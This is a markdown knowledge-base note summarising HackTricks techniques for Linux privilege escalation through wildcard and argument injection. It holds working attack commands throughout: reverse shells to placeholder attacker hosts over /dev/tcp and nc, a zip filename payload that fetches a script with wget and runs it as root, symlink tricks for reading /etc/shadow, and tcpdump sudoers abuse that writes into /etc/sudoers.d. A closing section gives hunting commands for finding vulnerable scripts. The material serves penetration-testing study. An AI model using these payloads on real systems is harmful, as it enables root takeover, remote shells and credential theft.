---
title: "HackTricks: Wildcards Spare Tricks"
tags:
  [
    linux-hardening,
    privilege-escalation,
    wildcard-injection,
    argument-injection,
  ]
sources: [hacktricks-wildcards-spare-tricks.md]
updated: 2026-05-01
---

# HackTricks: Wildcards Spare Tricks

Source: [hacktricks-wildcards-spare-tricks.md](../../raw/hacktricks-wildcards-spare-tricks.md)

## Key Takeaways

Wildcard (glob) **argument injection** exploits a shell expansion quirk: when a privileged script runs `tar *`, `rsync *`, `zip *`, etc. in an attacker-writable directory, filenames beginning with `-` become command-line flags rather than data. An attacker creates specially named files to inject arbitrary options — often achieving RCE or file read/write as root.

The `-- *` prefix fixes most GNU tools but **not** `7z`/`7za` (which have a separate `@listfile` mechanism parsed after `--`).

## Primitive Table

| Binary               | Attack vector                                             | Payload filenames      |
| -------------------- | --------------------------------------------------------- | ---------------------- |
| `tar` (GNU)          | `--checkpoint=1` + `--checkpoint-action=exec=sh shell.sh` | Two files + `shell.sh` |
| `tar` (bsdtar/macOS) | `--use-compress-program=/bin/sh`                          | One file               |
| `rsync`              | `-e sh shell.sh`                                          | One file               |
| `chown`/`chmod`      | `--reference=/root/secret`                                | One file               |
| `7z`/`7za`           | `@root.txt` + `root.txt → /etc/shadow` symlink            | Two entries            |
| `zip`                | `-T` (file) + `-TT wget … -O s.sh; bash s.sh` (file)      | Two separate files     |
| `flock`              | `-c <cmd>`                                                | One file               |
| `git`                | `-c core.sshCommand=<cmd>`                                | One file               |
| `scp`                | `-S <cmd>`                                                | One file               |

## tar — GNU checkpoint RCE

```bash
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
# root runs: tar -czf /backup/archive.tgz *  → shell.sh executes as root
```

## rsync injection

```bash
touch "-e sh shell.sh"
# root runs: rsync -az * backup:/srv/  → -e sh shell.sh injected
```

## 7z @listfile data exfil

```bash
ln -s /etc/shadow root.txt
touch @root.txt
# root runs: 7za a backup.7z -t7z -snl -- *
# 7z reads root.txt as file list → tries to open /etc/shadow → content in stderr
```

## zip -T -TT RCE

```bash
# Create two files (MUST be separate tokens — combined form fails to parse):
touch -- "-T"
touch -- "-TT wget 10.10.14.17 -O s.sh; bash s.sh"
# root runs: zip out.zip * → wget + bash execute
```

## tcpdump -G/-W/-z rotation RCE (wrapper injection)

When a vendor wrapper builds `tcpdump` argv from user-controlled fields:

```bash
# Drop reverse shell script
cat > /tmp/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
EOF
chmod +x /tmp/rce.sh

# Inject via "file name" parameter
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /tmp/rce.sh"
# -G 1 -W 1 forces rotate after first packet; -z executes script
```

## tcpdump sudoers misconfig

Pattern: `NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID> -F/var/cache/captures/filter.<GUID>`

- Override destination: pass second `-w /dev/shm/out.pcap` (last wins)
- Path traversal: `-w/var/cache/captures/a/../../../../dev/shm/out`
- Arbitrary-content write: use `-r crafted.pcap -w /etc/sudoers.d/evil`
- File read: `-V /root/root.txt` echoes lines in error output

## Hunting

```bash
# Find wildcard patterns in scripts
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\\*|\\$@|\\$\\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules allowing extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Tool: [`wildpwn`](https://github.com/localh0t/wildpwn) — combined tar/rsync attack PoC.

## Related

- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: Linux Privilege Escalation Checklist](hacktricks-privilege-escalation-checklist.md)
- [HackTricks: Write to Root](hacktricks-write-to-root.md)
- [HackTricks](../entities/hacktricks.md)
